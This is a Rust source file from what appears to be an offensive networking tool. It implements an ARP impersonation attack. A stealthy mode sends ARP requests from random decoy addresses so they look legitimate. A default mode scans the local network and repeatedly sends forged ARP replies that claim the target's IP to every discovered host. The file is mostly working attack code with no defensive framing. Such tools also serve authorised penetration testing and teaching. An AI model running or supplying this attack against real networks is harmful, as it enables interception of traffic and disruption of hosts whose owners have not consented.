use std::net::Ipv4Addr;
use std::time::{Instant, Duration};

use tabled::settings::{Alignment, Settings};

use crate::arp;
use crate::utils::{is_timer_expired, random_ip_in_network, loop_attack};

pub fn impersonate(interface: String, target: Ipv4Addr, stealthy: bool, period: u16) {
    match arp::nic::get_interface_by_name(&interface) {
        Ok(interface) => {
            let period = Duration::from_secs(period.into());

            if stealthy {
                let Some(net) = interface.network() else {
                    eprintln!("Interface not connected to a network.");
                    std::process::exit(1);
                };

                // Generate a random IP in the range of the network to make the ARP request look legitimate.
                let attack = || {
                    let decoy_ip = loop {
                        let random_ip = random_ip_in_network(&net);

                        // Ensure that the random IP is different from the target in order to prevent any interference from a potential ARP response from the target.
                        if random_ip.ne(&target) {
                            break random_ip;
                        }
                    };

                    arp::send_arp_request(&interface, decoy_ip, None, Some(target)).unwrap();
                };

                loop_attack!(attack, period);
            } else {
                // Perform an ARP scan to detect the available hosts on the network.
                println!("Launching ARP scan using timeout {} seconds...", 10);
                match arp::arp_scan(&interface, Duration::from_secs(10)) {
                    Ok(hosts) => {
                        // Construct output table
                        let table_config = Settings::default().with(Alignment::center());
                        let mut interfaces_table = tabled::builder::Builder::new();
                        interfaces_table.push_record(["IP Address", "MAC Address"]);

                        for host in &hosts {
                            interfaces_table
                                .push_record([host.0.to_string(), host.1.to_string()]);
                        }

                        // Print output
                        println!("Identified hosts:");
                        println!(
                            "{}",
                            interfaces_table.build().with(table_config).to_string()
                        );

                        println!("Launching ARP impersonation attack...");
                        let attack = move || {
                            for host in &hosts {
                                arp::send_arp_reply(
                                    &interface,
                                    host.1,
                                    host.0,
                                    None,
                                    Some(target),
                                )
                                .unwrap();
                            }
                        };

                        loop_attack!(attack, period);
                    }
                    Err(err) => {
                        eprintln!("{}", err.to_string());
                        std::process::exit(1);
                    }
                }
            }
        }
        Err(err) => {
            println!("{}", err.to_string());
            std::process::exit(1);
        }
    }

}